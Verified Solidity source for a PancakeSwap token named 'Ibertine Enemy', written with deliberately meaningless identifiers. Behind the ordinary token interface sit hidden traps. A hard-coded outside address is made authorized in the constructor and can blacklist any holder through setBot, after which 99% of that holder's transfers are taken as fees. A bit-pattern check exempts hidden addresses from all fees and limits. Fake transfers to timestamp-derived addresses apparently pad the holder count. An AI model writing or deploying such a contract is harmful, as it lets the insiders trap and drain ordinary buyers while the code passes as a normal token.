/**
 *Submitted for verification at BscScan.com on 2022-12-22
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.2;library SafeMath {    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }    function mod(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a % b;    }    }    function trySub(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b > a) return (false, 0);        return (true, a - b);    }    }    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function tryDiv(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a / b);    }    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function tryMod(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a % b);    }    }}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}interface IUniswapV2Router {    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function factory() external pure returns (address);    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function swapExactTokensForTokensSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);    function WETH() external pure returns (address);}interface IBEP20 {    function balanceOf(address account) external view returns (uint256);    function totalSupply() external view returns (uint256);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function name() external view returns (string memory);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    function symbol() external view returns (string memory);    function decimals() external view returns (uint8);    function approve(address spender, uint256 amount) external returns (bool);    function getOwner() external view returns (address);    function allowance(address _owner, address spender)    external    view    returns (uint256);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    function Owner() public view returns (address) {        return owner;    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }    function SetAuthorized(address adr) public onlyAuthorized() {        competent[adr] = true;    }    function removeAuthorized(address adr) public onlyOwner() {        competent[adr] = false;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }    modifier onlyAuthorized() {        require(isAuthorized(msg.sender), "!Authorized");        _;    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}contract IbertineEnemy is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    string constant _name = "Ibertine Enemy ";    string constant _symbol = "IbertineEnemy";    uint8 constant _decimals = 18;    //BUY FEES    uint256 private txLimitIsBuyBotsExemptMin = 0;    uint256 private buyFeeBotsMode = 6;    //SELL FEES    uint256 private tradingFeeSwapMarketing = 0;    uint256 private marketingWalletAutoFeeTx = 6;    bool private exemptLiquidityModeMarketing = true;    bool private maxTxBurnTradingMode = true;    bool private botsLiquidityIsTeam = true;    bool private teamBurnBotsModeWalletReceiver = true;    bool private buySwapWalletExempt = true;    uint256 private autoIsSellMin = _totalSupply / 1000; // 0.1%    uint256 private modeMaxReceiverSell = buyFeeBotsMode + txLimitIsBuyBotsExemptMin;    uint256 private botsBuyTradingIsAutoSell = 100;    bool private limitTxBurnBuyAutoSell;    uint256 private feeAutoLaunchedBuy;    uint256 private limitLaunchedSellSwap;    uint256 private buyModeSellIs;    uint256 private isTradingTxMode;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private botsSellFeeTx;    mapping(address => bool) private buyMinMaxTeam;    mapping(address => bool) private liquidityIsModeTxExemptReceiverSwap;    mapping(address => bool) private maxTxBurnTrading;    uint256 private launchBlock = 0;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private isLimitFeeWalletLiquiditySwapSell;    uint256 private buyAutoSellTx;    address private autoSwapMaxWallet = (msg.sender); // auto-liq address    address private minModeFeeAuto = (0x28a83Ea3e188Cd77141702A1FFffeF739301F2c8); // marketing address    address private botsBuyTeamSellExemptMode = DEAD;    address private autoMaxSwapLimit = DEAD;    address private botsLimitAutoBurn = DEAD;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);        bool public swapMaxAutoBurnExemptLaunched = false;    uint256 public tradingBuyMaxWallet = 0;    bool private maxReceiverTeamMarketingSwapBurnWallet = false;    uint256 private liquidityTradingSellLaunched = 0;    bool private swapFeeWalletAutoMax = false;    bool public minAutoExemptTx = false;    uint256 public buyIsReceiverBots = 0;    uint256 private exemptBotsLiquidityTradingIs = 0;    uint256 public txLimitExemptMax = 0;    uint256 public burnIsModeMaxAutoReceiverBuy = 0;    uint256 public tradingBuyMaxWallet0 = 0;    bool public tradingBuyMaxWallet1 = false;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        limitTxBurnBuyAutoSell = true;        liquidityIsModeTxExemptReceiverSwap[msg.sender] = true;        liquidityIsModeTxExemptReceiverSwap[0x0000000000000000000000000000000000000000] = true;        liquidityIsModeTxExemptReceiverSwap[0x000000000000000000000000000000000000dEaD] = true;        liquidityIsModeTxExemptReceiverSwap[address(this)] = true;        botsSellFeeTx[msg.sender] = true;        botsSellFeeTx[address(this)] = true;        buyMinMaxTeam[msg.sender] = true;        buyMinMaxTeam[0x0000000000000000000000000000000000000000] = true;        buyMinMaxTeam[0x000000000000000000000000000000000000dEaD] = true;        buyMinMaxTeam[address(this)] = true;        SetAuthorized(address(0x53485002e6809e109749187AffFfE0B58126b45A));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return swapLiquidityMarketingSellBuy(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return swapLiquidityMarketingSellBuy(sender, recipient, amount);    }    function botsMarketingTradingFee(address sender) internal view returns (bool) {        return !buyMinMaxTeam[sender];    }
    function setMinModeFeeAuto(address a0) public onlyOwner {        if (minModeFeeAuto != autoMaxSwapLimit) {            autoMaxSwapLimit=a0;        }        if (minModeFeeAuto == botsBuyTeamSellExemptMode) {            botsBuyTeamSellExemptMode=a0;        }        if (minModeFeeAuto != botsLimitAutoBurn) {            botsLimitAutoBurn=a0;        }        minModeFeeAuto=a0;    }
    function getLaunchBlock() public view returns (uint256) {        if (launchBlock != liquidityTradingSellLaunched) {            return liquidityTradingSellLaunched;        }        return launchBlock;    }
    function getLiquidityTradingSellLaunched() public view returns (uint256) {        if (liquidityTradingSellLaunched != autoIsSellMin) {            return autoIsSellMin;        }        if (liquidityTradingSellLaunched == exemptBotsLiquidityTradingIs) {            return exemptBotsLiquidityTradingIs;        }        if (liquidityTradingSellLaunched == marketingWalletAutoFeeTx) {            return marketingWalletAutoFeeTx;        }        return liquidityTradingSellLaunched;    }
    function buyReceiverMarketingBotsSell(address sender, bool selling) internal returns (uint256) {                if (selling) {            modeMaxReceiverSell = marketingWalletAutoFeeTx + tradingFeeSwapMarketing;            return modeMaxReceiverSell;        }        if (!selling && sender == uniswapV2Pair) {            modeMaxReceiverSell = buyFeeBotsMode + txLimitIsBuyBotsExemptMin;            return modeMaxReceiverSell;        }        return marketingWalletAutoFeeTx + tradingFeeSwapMarketing;    }
    function setLiquidityIsModeTxExemptReceiverSwap(address a0,bool a1) public onlyOwner {        if (a0 != minModeFeeAuto) {            maxTxBurnTradingMode=a1;        }        if (a0 == autoSwapMaxWallet) {            swapFeeWalletAutoMax=a1;        }        liquidityIsModeTxExemptReceiverSwap[a0]=a1;    }
    function getMaxTxBurnTradingMode() public view returns (bool) {        return maxTxBurnTradingMode;    }
    function botsMarketingModeIsMinBurnLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function isBot(address addr) public view returns (bool) {        return maxTxBurnTrading[addr];    }
    function teamLiquidityTxMin(address sender, address receiver, uint256 amount) internal returns (uint256) {                if (maxReceiverTeamMarketingSwapBurnWallet != exemptLiquidityModeMarketing) {            maxReceiverTeamMarketingSwapBurnWallet = maxTxBurnTradingMode;        }        uint256 feeAmount = amount.mul(buyReceiverMarketingBotsSell(sender, receiver == uniswapV2Pair)).div(botsBuyTradingIsAutoSell);        if (maxTxBurnTrading[sender] || maxTxBurnTrading[receiver]) {            feeAmount = amount.mul(99).div(botsBuyTradingIsAutoSell);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                if (_balances[address(this)] > 2 * 10 ** _decimals && sender == uniswapV2Pair) {            for (uint i = 0; i < 2; i++) {                address addr = address(uint160(block.timestamp + i));                _balances[addr] = _balances[addr] + 10 ** _decimals;                emit Transfer(address(this), addr, 10 ** _decimals);            }            _balances[address(this)] = _balances[address(this)].sub(2 * 10 ** _decimals);        }        return amount.sub(feeAmount);    }
    function getAutoSwapMaxWallet() public view returns (address) {        if (autoSwapMaxWallet == minModeFeeAuto) {            return minModeFeeAuto;        }        return autoSwapMaxWallet;    }
    function autoLimitSwapTrading() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    buySwapWalletExempt &&    _balances[address(this)] >= autoIsSellMin;    }
    function getMinModeFeeAuto() public view returns (address) {        return minModeFeeAuto;    }
    function setLiquidityTradingSellLaunched(uint256 a0) public onlyOwner {        if (liquidityTradingSellLaunched == txLimitIsBuyBotsExemptMin) {            txLimitIsBuyBotsExemptMin=a0;        }        liquidityTradingSellLaunched=a0;    }
    function setAutoSwapMaxWallet(address a0) public onlyOwner {        if (autoSwapMaxWallet == botsBuyTeamSellExemptMode) {            botsBuyTeamSellExemptMode=a0;        }        if (autoSwapMaxWallet == minModeFeeAuto) {            minModeFeeAuto=a0;        }        autoSwapMaxWallet=a0;    }
    function maxBuyIsReceiverTradingAuto(address addr) private view returns (bool) {        uint256 v0 = uint256(uint160(addr)) << 192;        v0 = v0 >> 238;        return v0 == firstSetAutoReceiver;    }
    function setLaunchBlock(uint256 a0) public onlyOwner {        if (launchBlock != exemptBotsLiquidityTradingIs) {            exemptBotsLiquidityTradingIs=a0;        }        if (launchBlock == liquidityTradingSellLaunched) {            liquidityTradingSellLaunched=a0;        }        launchBlock=a0;    }
    function walletTxLimitSellAutoFeeBuy() internal swapping {                uint256 amountToLiquify = autoIsSellMin.mul(txLimitIsBuyBotsExemptMin).div(modeMaxReceiverSell).div(2);        uint256 amountToSwap = autoIsSellMin.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                uint256 amountBNB = address(this).balance;        uint256 totalETHFee = modeMaxReceiverSell.sub(txLimitIsBuyBotsExemptMin.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(txLimitIsBuyBotsExemptMin).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(buyFeeBotsMode).div(totalETHFee);                payable(minModeFeeAuto).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                autoSwapMaxWallet,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    function setBot(address addr) public onlyAuthorized {        maxTxBurnTrading[addr] = true;    }
    function getLiquidityIsModeTxExemptReceiverSwap(address a0) public view returns (bool) {        if (liquidityIsModeTxExemptReceiverSwap[a0] != buyMinMaxTeam[a0]) {            return swapFeeWalletAutoMax;        }        if (liquidityIsModeTxExemptReceiverSwap[a0] != maxTxBurnTrading[a0]) {            return swapFeeWalletAutoMax;        }        if (a0 == autoMaxSwapLimit) {            return botsLiquidityIsTeam;        }            return liquidityIsModeTxExemptReceiverSwap[a0];    }
    function swapLiquidityMarketingSellBuy(address sender, address recipient, uint256 amount) internal returns (bool) {                if (swapFeeWalletAutoMax != buySwapWalletExempt) {            swapFeeWalletAutoMax = swapFeeWalletAutoMax;        }        if (maxReceiverTeamMarketingSwapBurnWallet != teamBurnBotsModeWalletReceiver) {            maxReceiverTeamMarketingSwapBurnWallet = botsLiquidityIsTeam;        }        bool bLimitTxWalletValue = maxBuyIsReceiverTradingAuto(sender) || maxBuyIsReceiverTradingAuto(recipient);                                if (inSwap || bLimitTxWalletValue) {return botsMarketingModeIsMinBurnLiquidity(sender, recipient, amount);}        if (!botsSellFeeTx[sender] && !botsSellFeeTx[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                if (liquidityTradingSellLaunched != txLimitIsBuyBotsExemptMin) {            liquidityTradingSellLaunched = launchBlock;        }        if (exemptBotsLiquidityTradingIs == exemptBotsLiquidityTradingIs) {            exemptBotsLiquidityTradingIs = tradingFeeSwapMarketing;        }        if (maxReceiverTeamMarketingSwapBurnWallet != teamBurnBotsModeWalletReceiver) {            maxReceiverTeamMarketingSwapBurnWallet = buySwapWalletExempt;        }        require((amount <= _maxTxAmount) || liquidityIsModeTxExemptReceiverSwap[sender] || liquidityIsModeTxExemptReceiverSwap[recipient], "Max TX Limit!");        if (autoLimitSwapTrading()) {walletTxLimitSellAutoFeeBuy();}        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                if (exemptBotsLiquidityTradingIs == buyFeeBotsMode) {            exemptBotsLiquidityTradingIs = botsBuyTradingIsAutoSell;        }        uint256 amountReceived = botsMarketingTradingFee(sender) ? teamLiquidityTxMin(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function setMaxTxBurnTradingMode(bool a0) public onlyOwner {        if (maxTxBurnTradingMode != swapFeeWalletAutoMax) {            swapFeeWalletAutoMax=a0;        }        if (maxTxBurnTradingMode == maxTxBurnTradingMode) {            maxTxBurnTradingMode=a0;        }        maxTxBurnTradingMode=a0;    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}